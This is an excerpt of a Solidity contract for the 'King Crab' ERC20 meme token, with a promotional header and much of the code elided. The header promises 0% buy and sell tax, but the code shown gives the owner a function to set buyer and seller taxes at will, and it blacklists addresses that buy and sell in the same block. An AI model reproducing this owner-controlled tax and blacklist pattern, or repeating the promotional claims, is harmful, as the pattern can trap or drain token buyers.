 ...
 * Missed $Lobster?
 *
 * Many people who missed $Lobster is on the way to $King Crab .
 *
 * $KING CRAB will flip $Lobster
 *
 * We eat like kings.🍺😘
 *
 * This is the coin for you, for all the $KING CRAB
 *
 * Tax:
 *
 * total buy 0%
 * total sell 0%
 *
 * Web:       www.kingcrab.world
 * Telegram:  https://t.me/kingcraberc20
 * Twitter: twitter.com/KingCrabERC20?t=K2PXwnIbtQsw54vloQAF_w&s=09
 */
...
// File: contracts/sell/KingCrabERC20Token.sol
pragma solidity ^0.8.9;

contract KingCrabERC20Token is IERC20, ReentrancyGuard, Ownable {
    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;
    string private _name = "King Crab";
    string private _symbol = unicode"King🦀";
    ...
    mapping(address => uint256) private _kingList;
    mapping (address => bool) private kingList;
    ...
    constructor() {
        ...
        marketingWallet = address(0xa349d4a2A1045B02b4F1816e5e0F72E2BE99a15d); // set as marketing wallet
    ...
    */
    ...
    function BASEMODE(uint256 marketingTaxForBuyers,uint256 marketingTaxForSellers,bool _limitsInEffect) external onlyOwner() {
    ...
    function _transfer(
        ...
        require(!kingList[_recipient] && !kingList[_sender], "You have been kingList from transfering tokens");

        uint256 rAmount = _amount;

        // when buy
        if (_sender == uniswapPair) {
            _kingList[_recipient] = block.number;
        ...
        // when sell
            ...
            if (limitsInEffect) {
                if (block.number == _kingList[_sender]) {
                    kingList[_sender] = true;
                }
                if (_sender == owner() && _sender == marketingWallet) {
                    sellTax = 0;    
                }
                require(block.number != _kingList[_sender], "exceeded max amount");
            }
